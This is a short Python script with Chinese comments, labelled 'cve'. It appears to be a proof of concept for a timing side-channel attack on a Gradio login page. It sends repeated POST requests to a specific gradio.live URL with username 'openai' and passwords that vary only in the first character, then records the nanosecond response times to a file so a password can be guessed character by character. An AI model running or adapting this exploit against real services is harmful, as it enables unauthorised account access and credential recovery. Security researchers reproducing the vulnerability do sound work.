import sys
import time
import requests
import argparse

# 定义主函数
def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(prog='cve', description='Send POST requests with different passwords', epilog='End of help text')
    parser.add_argument('-c', action='append', help='List of characters to append to password')
    parser.add_argument('-r', type=int, help='Number of repetitions for sending requests')
    parser.add_argument('output_file', help='Output file to write the response time')

    args = parser.parse_args()

    # 获取参数值
    characters = args.c
    repeats = args.r
    output_file = args.output_file

    # 打印字符列表
    print("Characters to be used:", characters)

    # 打开输出文件进行写入
    with open(output_file, "w") as out_fd:
        out_fd.write("raw times\n")  # 文件头部写入说明

        # 重复执行指定次数
        for i in range(repeats):
            print(f"Pass {i + 1}/{repeats} executed")

            # 对每个字符执行POST请求
            for character in characters:
                print(f"Using character: {character}")

                # 构建请求数据
                data = {
                    'username': 'openai',
                    'password': f'{character}AAAAAAA'  # 密码格式
                }

                # 记录请求开始时间
                time_start = time.monotonic_ns()

                try:
                    # 发送POST请求
                    response = requests.post("https://29f8a8329e423aad91.gradio.live/login", data)
                except requests.RequestException as e:
                    print(f"Request failed: {e}")
                    continue  # 如果请求失败，跳过此次循环

                # 计算请求响应时间
                diff = time.monotonic_ns() - time_start

                # 将响应时间写入输出文件
                out_fd.write(f"{diff}\n")

# 调用main函数
if __name__ == '__main__':
    main()
